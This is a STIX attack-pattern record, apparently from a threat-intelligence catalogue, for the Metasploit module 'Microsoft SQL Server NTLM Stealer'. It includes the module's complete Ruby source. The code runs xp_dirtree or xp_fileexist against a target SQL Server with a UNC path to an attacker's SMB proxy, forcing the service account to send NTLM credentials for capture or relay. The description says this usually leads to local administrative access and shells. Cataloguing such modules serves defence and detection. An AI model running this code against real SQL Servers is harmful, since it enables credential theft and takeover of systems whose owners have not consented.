{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86a10a0b-1c8c-4572-b5bd-e94a4f080e74",
    "created": "2024-08-14T16:22:29.896394Z",
    "modified": "2024-08-14T16:22:29.896398Z",
    "name": "Microsoft SQL Server NTLM Stealer",
    "description": " This module can be used to help capture or relay the LM/NTLM credentials of the account running the remote SQL Server service. The module will use the supplied credentials to connect to the target SQL Server instance and execute the native \"xp_dirtree\" or \"xp_fileexist\" stored procedure.   The stored procedures will then force the service account to authenticate to the system defined in the SMBProxy option. In order for the attack to be successful, the SMB capture or relay module must be running on the system defined as the SMBProxy.  The database account used to connect to the database should only require the \"PUBLIC\" role to execute. Successful execution of this attack usually results in local administrative access to the Windows system.  Specifically, this works great for relaying credentials between two SQL Servers using a shared service account to get shells.  However, if the relay fails, then the LM hash can be reversed using the Halflm rainbow tables and john the ripper. Thanks to \"Sh2kerr\" who wrote the ora_ntlm_stealer for the inspiration. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_ntlm_stealer.rb",
            "external_id": "mssql_ntlm_stealer.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://en.wikipedia.org/wiki/SMBRelay"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server NTLM Stealer',\n      'Description'    => %q{\n          This module can be used to help capture or relay the LM/NTLM credentials of the\n        account running the remote SQL Server service. The module will use the supplied\n        credentials to connect to the target SQL Server instance and execute the native\n        \"xp_dirtree\" or \"xp_fileexist\" stored procedure.   The stored procedures will then\n        force the service account to authenticate to the system defined in the SMBProxy\n        option. In order for the attack to be successful, the SMB capture or relay module\n        must be running on the system defined as the SMBProxy.  The database account used\n        to connect to the database should only require the \"PUBLIC\" role to execute.\n        Successful execution of this attack usually results in local administrative access\n        to the Windows system.  Specifically, this works great for relaying credentials\n        between two SQL Servers using a shared service account to get shells.  However, if\n        the relay fails, then the LM hash can be reversed using the Halflm rainbow tables\n        and john the ripper. Thanks to \"Sh2kerr\" who wrote the ora_ntlm_stealer for the\n        inspiration.\n      },\n      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     => [[ 'URL', 'https://en.wikipedia.org/wiki/SMBRelay' ]]\n    ))\n\n    register_options(\n      [\n        OptString.new('SMBPROXY', [ true, 'IP of SMB proxy or sniffer.', '0.0.0.0']),\n      ])\n  end\n\n  def run_host(ip)\n\n    # Reminder\n    print_status(\"DONT FORGET to run a SMB capture or relay module!\")\n\n    # Call auth_force method to execute \"xp_dirtree\"\n    begin\n      force_auth(\"xp_dirtree\",datastore['SMBPROXY'])\n      return\n    rescue\n      print_error(\"xp_dirtree failed to initiate authentication to smbproxy.\")\n    end\n\n    # Call auth_force method to execute \"xp_fileexist\" if \"xp_dirtree\" fails\n    begin\n      force_auth(\"xp_fileexist\",datastore['SMBPROXY'])\n      return\n    rescue\n      print_error(\"xp_fileexist failed to initiate authentication to smbproxy.\")\n    end\n\n  end\n\n  # Method to force sql server to authenticate\n  def force_auth(sprocedure,smbproxy)\n\n    print_status(\"Forcing SQL Server at #{rhost} to auth to #{smbproxy} via #{sprocedure}...\")\n\n    # Generate random file name\n    rand_filename = Rex::Text.rand_text_alpha(8, bad='')\n\n    # Setup query\n    sql = \"#{sprocedure} '\\\\\\\\#{smbproxy}\\\\#{rand_filename}'\"\n    result = mssql_query(sql, false) if mssql_login_datastore\n    column_data = result[:rows]\n    print_good(\"Successfully executed #{sprocedure} on #{rhost}\")\n    print_good(\"Go check your SMB relay or capture module for goodies!\")\n\n  end\nend\n"
}